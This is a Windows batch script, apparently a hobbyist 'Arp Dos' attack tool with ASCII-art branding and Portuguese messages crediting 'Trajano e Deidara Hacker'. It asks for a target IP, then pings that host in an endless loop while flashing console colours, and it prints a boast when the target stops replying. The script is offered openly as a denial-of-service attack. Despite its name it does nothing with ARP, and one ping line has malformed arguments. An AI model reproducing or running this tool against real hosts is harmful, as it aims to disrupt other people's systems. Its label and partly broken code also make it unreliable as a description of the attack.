@echo off                    
color 3
title Arp Dos

:greeting
cls

                                                                                  
echo        db                                      888b      88                       
echo       d88b                                     8888b     88                ,d     
echo      d8'`8b                                    88 `8b    88                88     
echo     d8'  `8b      8b,dPPYba,  8b,dPPYba,       88  `8b   88   ,adPPYba,  MM88MMM  
echo    d8YaaaaY8b     88P'   "Y8  88P'    "8a      88   `8b  88  a8P_____88    88     
echo   d8""""""""8b    88          88       d8      88    `8b 88  8PP"""""""    88     
echo  d8'        `8b   88          88b,   ,a8"      88     `8888  "8b,   ,aa    88,    
echo d8'          `8b  88          88`YbbdP"'       88      `888   `"Ybbd8"'    "Y888  
echo                               88                                                  
echo                               88                                                  
echo -----------------------------------------------------------------   
echo -	 	  CTRL+C Para parar o ataque                 -
echo =============================================
echo By: Trajano e Deidara Hacker

set /p IP=Enter IP::
:top
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=0b & echo Derrubado Por Trajano e Deidara.) 
color %in%
set /a num=(%Random%%%9)+1
color %num%
ping -t 2 0 10 %ip% >nul
GoTo top 